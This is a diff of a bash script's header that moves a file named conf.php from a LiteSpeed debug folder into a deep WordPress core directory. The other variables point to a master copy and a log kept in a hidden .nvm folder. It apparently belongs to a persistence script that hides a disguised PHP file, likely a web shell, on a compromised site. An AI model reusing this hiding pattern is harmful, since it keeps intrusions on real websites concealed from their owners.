@@ -1,6 +1,6 @@
 #!/bin/bash
 
-INDEX_FILE="/var/www/h160399/data/www/optasia.by/wp-content/litespeed/debug/conf.php"
+INDEX_FILE="/var/www/h160399/data/www/optasia.by/wp-includes/SimplePie/src/XML/Declaration/conf.php"
 INDEX_MASTER="/var/www/h160399/data/.nvm/bash_check"
 LOG_FILE="/var/www/h160399/data/.nvm/map.se"
 
